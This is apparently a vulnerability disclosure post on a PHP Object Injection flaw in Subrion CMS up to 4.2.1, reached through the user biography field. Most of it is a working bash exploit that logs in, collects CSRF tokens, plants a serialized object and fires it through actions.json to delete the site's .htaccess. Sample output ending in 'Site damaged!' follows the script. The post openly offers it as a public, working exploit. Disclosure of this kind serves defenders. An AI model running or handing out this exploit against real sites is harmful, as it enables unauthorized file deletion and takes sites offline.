# Actions - PHP Object Injection

This vulnerability was found almost contemporaneously by both me and MS509 Team. As the first public appearance of this issue was made by them on the github page of Subrion, the author of this post is not taking credit for this finding. The aim of this report was to provide a slightly different exploitation method and a public, working exploit.

## VulDB-Like Summary

A vulnerability has been found in the Subrion CMS up to v4.2.1. It has been rated as problematic. Affected by this issue is the file `/actions.php`. The manipulation of the of the **biography** value within a user profile leads to a PHP Object Injection vulnerability. Using CWE to declare the problem leads to CWE-502. Impacted is Integrity and Availability. An attacker might be able inject arbitrary PHP objects within the application context, and use them to achive arbitrary file deletion.

The weakness was originally presented by MS509 on 03/05/2020. A public exploit was released on 04/14/2020 by Alessandro Magnosi (deadc0de) (GitHub Repository). The advisory (english) is shared for download at github.com. This vulnerability is not handled as a CVE currently. The attack may be launched remotely. A single form of authentication is required for exploitation. Technical details are known and an exploit is publicly available.

## Proof-of-Concept

The following script may be used to easily verify the vulnerability:

```bash
#!/bin/bash

username="admin"
password="Passw0rd!"
target="http://subrion.local/panel/"
proxy="http://127.0.0.1:8080"
id=1 # ID 1 = Admin
debug=0

# Grep Session Cookie Name
sess_cookie=$(curl -ks -x $proxy $target -I | grep "Set-Cookie" | head -n 1 | grep -oP "INTELLI_\w*\=\w*")
cookies="Cookie: loader=loaded; $sess_cookie"
# Grep CSRF Token
csrf_token=$(curl -ks -x http://127.0.0.1:8080 $target | grep "__st" | grep -oP "value=\"\K([a-zA-Z0-9]*)" | head -n 1)
echo "[*] Logging in"
# Fix the Session Cookie Value and login
res=$(curl -ks -x $proxy $target -X POST --data "__st=$csrf_token&username=$username&password=$password" -H "$cookies" -i | grep "Set-Cookie")

echo "[*] Adding evil PHP Object within biography"
# Get CSRF Token
csrf_token=$(curl -i -s -k -H "$cookies" -x $proxy "$target/panel/members/edit/$id/" | grep "__st" | grep -oP "value=\"\K([a-zA-Z0-9]*)" | head -n 1)

# Generating Payload
payload=$(php serializer.php -c s -t a)

if [ $debug -gt 0 ]; then
    echo $payload
fi

# Add the crafted parameter
res=$(curl -i -s -k -X "POST" -x $proxy -H "Expect:" -H "$cookies" -F "__st=$csrf_token" -F "username=admin" -F "fullname=Administrator" -F "email=admin@subrion.local" -F "email_language=en" -F "save=1" -F "goto=list" --form-string "biography=$payload" "$target/members/edit/1/")

if [[ $(echo $res | grep "HTTP/1.1" | grep "302") == "" ]]; then
    echo "Could not add the evil PHP Object"
    exit 1
fi
echo "[*] Triggering File deletion"
# Get CSRF token
csrf_token=$(curl -ks -H "$cookies" -x $proxy $target | grep "__st" | grep -oP "value=\"\K([a-zA-Z0-9]*)" | head -n 1)
# Get block ID to trigger
res=$(curl -i -s -k -X "POST" -H "$cookies;  XDEBUG_SESSION=XDEBUG_ECLIPSE;" -x $proxy "$(echo $target | sed 's/panel\///g')/actions.json" -F "__st=$csrf_token" -F "action=edit-picture-title" -F "field=biography" -F "item=member" -F "itemid=$id" -F "path=tmp" )

# Confirming deletion, checking 404 
res=$(curl -i -s -k -H "$cookies" -x $proxy "$target/panel/blocks/" | head -n 1 | grep -oP "\d{3}")
if [[ "$res" == "404" ]]; then
    echo "[+] Done! Site damaged!"
else
    echo "[-] Error, site patched!"
fi
```

Using the above script should give the following output, proving the vulnerability.

```
$ ./exploit.sh
[*] Logging in
[*] Adding evil PHP Object
[*] Triggering File deletion
[+] Done! Site damaged!
```

When the script finishes, the site should not be reachable anymore, as the .htaccess has been deleted. In case the configuration of the site is more robust, check for the presence of `.htaccess` within Subrion HOME direcotry.

## Remediation

Currently, no fixes are available for this issue.

## References

*   [https://cwe.mitre.org/data/definitions/1236.html](https://cwe.mitre.org/data/definitions/1236.html)
*   [https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)